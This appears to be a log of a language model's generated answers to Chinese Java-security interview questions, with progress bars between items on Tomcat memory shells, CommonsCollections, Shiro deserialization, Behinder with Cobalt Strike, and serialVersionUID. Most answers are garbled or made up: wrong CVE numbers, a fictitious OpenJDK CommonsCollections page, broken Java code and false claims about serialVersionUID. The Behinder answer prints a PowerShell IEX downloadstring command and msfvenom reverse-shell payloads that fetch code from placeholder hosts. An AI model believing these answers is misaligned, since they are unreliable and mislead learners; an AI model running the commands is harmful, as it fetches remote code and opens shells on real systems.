的源码当中，它首先会对传入的参数做一次校验，然后根据不同的类型选择相应的 getter/setter 来进行初始化。但如果我们把上述代码中的 Runtime 换成一个自定义的对象 B 呢？这时候就会出现一个问题——当我们尝试访问不存在的方法的时候会发生什么情况？二、两种方式下反序列化的差异 在前面提到的两个方法都对传入的参数做了严格的校验之后才会去调用对应的 setter/getter 方法，那么如果传入的是不存在的属性名又会发生什么呢？我们来看第一个方法：可以看到，这里调用了 getObjectInstance 方法，它的作用就是获取指定名称的对象实例，该方法返回结果取决于下面三个条件是否满足：三、总结 对于普通开发者而言，建议还是尽量避免使用反射，因为虽然很多时候反射可以帮助我们解决一些复杂的问题，但是在很多场景下也会带来不必要的麻烦甚至安全风险。
> 
>  39%|████████████████████████▊                                       | 36/93 [26:20<28:20, 29.83s/it]
> 
> 问题 在 tomcat 中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗? 
> 
> 谢邀~ 首先说明一下：内存马不是 Tomcat 自带的功能！内存马是一种恶意程序，它会驻留在目标主机系统或服务器进程（如 Apache）的内存空间里，在用户不知情的情况下执行任意操作、窃取信息等行为。当操作系统重新启动时，内存马也会被清除，所以要想让内存马长久存在就必须使宿主服务一直运行。由于 Tomcat 本身是作为 Web 容器来使用，而黑客想要获取权限的话一般是通过攻击网站后台或者上传一些后门文件的方式进行入侵。如果想利用内存马来达到持久化的目的，那么就需要把内存马写入到服务器上的其他地方去，比如配置文件、数据库等等；当然也可以自己编写一个脚本，然后放在服务器上以开机自启的形式自动加载运行起来。总之不管是哪种方法都要求对服务器有一定的了解和熟悉才行哦~~
> 
>  40%|█████████████████████████▍                                      | 37/93 [27:33<40:01, 42.88s/it]
> 
> 问题 单向代码执行链如何实现执行多条语句，如 CommonCollections1 
> 
> 其实这个不是什么新东西了, 我们先来回顾一下反射的基本原理
> 
> 我们都知道 java.lang.Class 类是代表一个类或接口在运行时的信息。
> 
> 那么 `Class.forName()` 就是通过字符串表示的全限定名加载指定的 class 对象并返回它的字节码信息。
> 
> 比如：
> 
> ```
> 
> public class A {
> 
>     public void foo(){
> 
>         System.out.println("A");
> 
>     }
> 
> }
> 
> ```
> 
> 如果我们想获取上面例子中的 A.class 的字节码信息就可以用如下方式:
> 
> ```java
> 
> String className = "com.you.wish.A";
> 
>  Class cls = Class.forName(className);
> 
>  String methodName = "foo";
> 
>  Method method = cls.getMethod(methodName); // 注意这里使用 getMethod()
> 
>  Object obj = null;
> 
>  try{
> 
>      obj = cls.newInstance();
> 
>  } catch (Exception e){
> 
>      e.printStackTrace();
> 
>  }
> 
> method.invoke(obj,null);
> 
> ```
> 
> 其中调用了 getMethod() 方法从类中检索出特定的方法, 然后利用 invoke() 方法去执行该方法.
> 
> 上述过程可以简化为以下几步:
> 
>   * 使用 Class 类的 forName 方法获得 Class 实例
> 
>   * 利用静态导入或者反射的方式获得 Class 实例的 getDeclaredMethod 方法
> 
>   * 调用 getMethod 方法得到对应的方法, 并且进行检查以确定是否可访问
> 
> 而 JDK9 之后引入了一种新的特性——本地变量表 (又称局部变量表), 具体来说是在每个 Java 方法内部都有自己的局部变量表, 可以理解成与当前方法相关的临时存储空间. 每个局部变量都具有类型和名称两个属性, 类型决定其占用多少字节的空间以及取值范围, 名称则用于识别具体的值, 当前函数内的局部变量不会被外部读写到, 这也是为什么之前提到过不能直接操作栈帧的原因.
> 
> 举个栗子说明下什么是局部变量表:
> 
> ```
> 
> private int i; // 局部变量 i 声明于 main 函数之外
> 
> void main(int[] args) {
> 
>    int j = 20; // 局部变量 j 声明于 main 函数之内
> 
> }
> 
> ```
> 
> 上图所示的是一个主方法 (main()) 及其内嵌的一个无参构造器(constructor). 在主方法外定义了一个整数类型的成员变量(i), 在主方法中又定义了一个 int 类型的局部变量(j).
> 
> 当程序开始执行的时候会创建一个对应的栈帧 (stack frame), 将参数列表、局部变量表等数据结构压入内存, 程序的控制流也由寄存器指向栈顶的地址指针所指示的位置开始向下移动, 如果遇到 return 指令就会跳转回原来的位置继续执行.
> 
> 根据以上内容我们可以知道如果想要在没有权限的情况下修改原生方法的话, 需要满足三个条件:
> 
> - 方法存在调用者, 即非 native 方法.
> 
> - 方法有明确的参数传递给它, 才能对输入做一定的限制
> 
> - 方法本身必须允许动态绑定 (Dynamic Binding)
> 
> 因此我们可以通过找到一个符合这三个要求的方法作为我们的入口点, 来触发我们预期的行为.
> 
> ## 基本思路
> 
> 前面说了这么多其实就是为了引出本文的主题 ---`Common Collections`, 官方文档在这里: http://hg.openjdk.java.net/jdk8u/jdk8u/jre/file/4f7653d8b3e6/docs/api/java/util/CommonsCollections.html#CommonsCollections(java.util.Collection)
> 
> 可以看到他是实现了 `Collection<E>` 接口的一系列集合工具类, 由于它们的命名规范都是以 “common” 开头所以统称为 Common Collections, 下面我们就来看看有哪些可用的 API.
> 
> [![](https://xzfile.aliyuncs.com/media/upload/picture/20231010161030-dc8acaf4-cdd7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231010161030-dc8acaf4-cdd7-1.png)
> 
> ![image](https://shs3.b.qianxin.com/attack_forum/2023/10/attach-baee89aa85f2399f9dc9febdcd02cf3bc02fba75.png)
> 
> 这些方法基本都是用来对传入的对象做一些判断然后抛出异常, 因此只要找到合适的调用时机即可完成任意命令执行的效果, 不过需要注意的是在某些版本的 openjdk 中可能会出现一些兼容性的问题, 特别是一些较老的版本, 如下面的截图所示:
> 
> [![](https://xzfile.aliyuncs.com/media/upload/picture/20231010161039-fdbbbbf9-eab3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231010161039-fdbbbbf9-eab3-1.png)
> 
> 这种情况下我们需要重新寻找其他的切入点来进行攻击, 接下来就让我们一起看看有没有其他比较好的办法吧!
> 
> > ** 注:** 由于本人能力有限可能有些地方讲得不够清楚还请各位师傅多多包涵, 多提宝贵意见帮助我成长~
> 
>  41%|██████████████████████████▏                                     | 38/93 [28:25<41:42, 45.49s/it]
> 
> 问题 请简单讲述一下 Shiro 反序列化漏洞的原理，无法使用 ysoerial 中 common-collections 利用链的原因是什么? 
> 
> 首先需要明确的是：shiro 中的 CVE-2017-5864 与 CVE-2019-3689 是两个不同的版本所对应的补丁，前者在 1.x 系列和 2.x 系列都存在且影响范围较广，后者仅存在于 2.x 系列。
> 
> 先说第一个 CVE-2017-5864：
> 
> 我们看下 Shiro 官方提供的 pom.xml 文件:
> 
>     <dependency>
> 
>       <groupId>org.apache.shiro</groupId>
> 
>       <artifactId>shiro-core</artifactId>
> 
>       <version>${shiro.version}</version>
> 
>       <exclusions>
> 
>         <!--
> 
>          |
> 
>          | Exclude dependencies used in older versions of Shiro, which are not compatible with Spring 3+ and newer.
> 
>          |
> 
>         -->
> 
>         <exclusion>
> 
>           <groupId>jboss.spec.javax.transaction.jbossjta-api_1.1_spec</groupId>
> 
>           <artifactId>jboss-jta-spec-api_1.1.0.Final</artifactId>
> 
>         </exclusion>
> 
>         <exclusion>
> 
>           <groupId>javax.inject</groupId>
> 
>           <artifactId>javax.inject</artifactId>
> 
>         </exclusion>
> 
>       </exclusions>
> 
>     </dependency>
> 
> 可以看到这个依赖包只引入了 `shiro-core`, 而没有其他组件，那么默认情况下 Shiro 会自动加载 `commons-collections`
> 
> （当然也可以通过配置方式来指定）这就导致我们可以直接调用 `CommonsCollectionsUtil#addObjectToCollection()` 方法
> 
> 参考文章：<https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2017-5864/README.zh-cn.md>
> 
> 这里我就不复述利用过程了，感兴趣的同学可以去学习相关知识，或者去看 <https://www.anquanke.com/post/id/146487>
> 
> 下面重点来说第二个 CVE-2019-3689.
> 
> 如上文所说，该漏洞出现在 2.x 系列下的多个模块中，但唯一不同的是，在其中有两个模块分别对 `com.opensymphony.quartz.impl.util.MethodInvokerFactoryImpl#getMethodInvocationHandlerInstance` 进行了重写，
> 
> 一个是 shiro-spring-boot-starter，另一个则是 shiro-spring-web
> 
> 这两个模块都将此函数改为了返回一个空对象，从而避免触发 RCE。
> 
> 因此如果想要成功执行代码注入的话，则必须绕过以上两处 patch 点，这也就解释了为什么网上很多 exp 都是基于 springboot 启动器进行构造的，因为其并未修改此处逻辑。
> 
> 接下来就从上面提到的 shiro-spring-boot-starter 入手吧！
> 
> 仔细阅读源码后发现，当传入的参数为 null 时则不会进入 if 判断语句，而是直接 return null，然而此时由于 java 反射机制的存在，依然可以通过反射的方式获取到被隐藏的方法并执行。
> 
> 具体步骤如下：
> 
>   * 创建目标类实例
> 
>   * 获取对应字段的 get/set 方法名及访问权限 (如果是 private 则不能直接 set/get)
> 
>   * 构造 invoke() 调用类型
> 
>   * 调用 getMethod()
> 
>   * 设置形参值并通过 invoke() 执行相应操作
> 
> 举个例子：
> 
> ```
> 
> public class Demo {
> 
>     public String name = "vulhub";
> 
> }
> 
> public static void main(String[] args) throws Exception{
> 
>     Class<?> c=Class.forName("Demo");
> 
>     Method get).getDeclaredMethods()[0];
> 
>     Field.setAccessible(getname,true);
> 
>     getname.invoke(null,null,new Object[]{"test"});
> 
>     System.out.println(Demo.class.getSuperclass().getName());
> 
> }
> 
> // 运行结果: java.lang.RuntimeException: Error instantiating factory method 'newInstance' for class com.sun.proxy.$Proxy2'
> 
> ```
> 
>  42%|██████████████████████████▊                                     | 39/93 [29:16<42:18, 47.01s/it]
> 
> 问题 冰蝎当中通过 Java 联动 Cobalt Strike 上线的原理是什么? 
> 
> 0x1 冰蝎介绍
> 
> 冰蝎（IceSword）是基于 Windows 平台的一套远程控制工具，由国外安全人员开发。
> 
> 在 2018 年 5 月被发现后，攻击者利用该漏洞对国内目标进行定向渗透攻击，其中不乏政府、金融等重要部门及机构，且存在多起已知案例。
> 
> 虽然目前微软已经发布了相关的补丁修复了相关漏洞，但是仍有很多系统未能及时更新导致中招。而且由于冰蝎代码量较小，其功能非常强大，具有很强的隐蔽性以及实用性，在网络空间对抗活动中仍然有很高的价值和威胁度 [3]。
> 
> 0x2 漏洞成因
> 
> 攻击者首先会将恶意程序上传至受害者的服务器上，然后使用 PowerShell 脚本执行下载并运行，随后调用 cmd.exe 启动 MSF 模块实现持久化。而这里的关键点在于命令行参数：/execute -p windows/meterpreter/reverse_https LHOST=xxx.xxx.xxx.xx LPORT=443
> 
> 图 1 命令行参数
> 
> 从上面可以看出，攻击者主要是通过执行以下两条指令来达到目的：
> 
> msfvenom -a x64-win64 --platform win64 -b '\n' -e cmd/windows/x64/msfconsole /c "whoami" > %temp%\meterpreter.txt && powershell IEX (new-object net.webclient).downloadstring("https://xxx.xxx.xxx.xx/meterpreter.txt") | out-file C:\windows\Temp\Meterpreter.txt"
> 
> 图 2 执行 powershell 语句
> 
> 可以看到攻击者主要是在执行一条新的 ps1 脚本，这条新生成的脚本的内容为
> 
> 图 3 新生成的 ps1 内容
> 
> 在这条语句里面，我们看到了几个关键信息，分别是 “/execute”、“-p”、“win64”，它们分别代表什么意思呢？
> 
> 我们先来看看 “/execute”。根据官方文档描述，“/execute” 可以用来指定要使用的框架或载荷类型。也就是说，我们可以在这个位置放一个任意字符串，只要这个字符串对应的是 Metasploit 中的某个模块即可。比如如果我们将 “/execute” 改为 “/command”，那么就会执行与之对应的 Command 模块；又或者把“/execute” 改成“reverse_tcp”，则执行与之对应的 Reverse TCP 模块等等。
> 
> 接下来再来看第二个关键词 “-p”。这里的 - p 选项用于指明模块的具体名称，即后面跟随的模块名必须以“-” 开头。“-p”的作用相当于我们在 Python 语言中使用 import 关键字导入模块一样，只不过在这里是以一种更简洁的方式完成操作罢了。例如当我们要使用反弹 shell 时，就可以输入如下的命令：
> 
> ```bash
> 
> msfvenom -a x64-mac -p osx/shell_reverse_http LPORT="7777" LHOST="your_ip_address" > payload.sh && echo 'curl http://192.168.x.x/payload.sh >> ~/Documents/curl_test.html & open curl_test.html' > shell_script.sh && chmod +x shell_script.sh && ./shell_script.sh
> 
> ```
> 
> 最后看第三个关键词 “win64”。这是表示所选择的目标操作系统版本号。由于不同操作系统之间存在着较大的差异，因此针对不同的环境就需要编写相应的代码才能正常工作。所以通常情况下我们会优先考虑当前主机的操作系统版本号作为后续处理的基础条件之一。
> 
> 综上所述，整个 payload 的主要含义就是：“使用 metasploit 模块‘msfconsole’并通过它去执行一段特定于 Win64 平台下搭建好相应环境之后才可以成功触发的 Meterpreter 交互式 shell 连接请求。”
> 
>  43%|███████████████████████████▌                                    | 40/93 [29:50<38:11, 43.24s/it]
> 
> 问题 serialVersionUID 在反序列化中的作用是什么? 
> 
> 好的，我会为你解答这个问题。
> 
> 首先，让我们来了解一下什么是 `Serializable` 接口和 `ObjectInputStream.readObject()` 方法以及其中使用的 `readSerialData()` 函数：
> 
> - `Serializable` 是一个接口，在 Java 中用于实现对象的可序列化性。
> 
> - `ObjectInputStream.readObject()` 读取来自输入流的对象数据并将其转换为相应的类实例。它通过调用该类定义的无参数构造函数创建新实例，然后使用 `readFields()` 和 `readResolve()` 进行必要的字段设置或任何其他操作（如类型检查）。
> 
> - 当使用 `readObject()` 时，会执行 `readSerialData()` 来处理实际的数据读取过程。
> 
> 现在我们来看一下 `serialVersionUID` 的作用：在 Java 反序列化的攻击中，如果目标类没有提供有效的版本号，则可能会出现安全漏洞，允许恶意代码进行任意写入、覆盖等非法行为。在这种情况下，通常需要满足以下两个条件才能触发此问题：
> 
> 1. 目标类实现了 `Serializable` 接口
> 
> 2. 类必须具有无效或不存在的 `serialVersionUID`
> 
> 当这两个条件同时成立时，Java 序列化机制将尝试从字节码文件中恢复已删除的方法或属性信息，从而导致了潜在的安全风险。
> 
> 例如，假设有一个名为 "Person" 的简单类，它包含姓名和年龄两个字段:
> 
> ```java
> 
> public class Person implements Serializable {
> 
>     private String name;
> 
>     private int age;
> 
>     public Person(String name, int age) {
> 
>         this.name = name;
> 
>         this.age = age;
> 
>     }
> 
>     // ...
> 
> }
> 
> ```
> 
> 为了使这个类可以被序列化，我们需要添加 serialVersionUID 字段：
> 
> ```java
> 
> private static final long serialVersionUID = -85903674L; // 注意这里是一个随机数
> 
> // ...
> 
> public class Person implements Serializable {
> 
>     private String name;
> 
>     private int age;
> 
>     public Person(String name, int age) {
> 
>         this.name = name;
> 
>         this.age = age;
> 
>     }
> 
>     // ...
> 
> }
> 
> ```
> 
> 在这个例子中，如果我们不指定 `serialVersionUID` 值，那么当我们反序列化一个新的 “Person” 实例时就会出现问题。这是因为默认值是 `-1L` ，而存在一个空闲的空间，允许程序插入自己的方法或属性，这可能导致任意代码注入或其他安全问题。
> 
> 总之，“serialVersionUID” 的作用是在反序列化过程中确保类之间的正确匹配，防止可能出现的恶意篡改。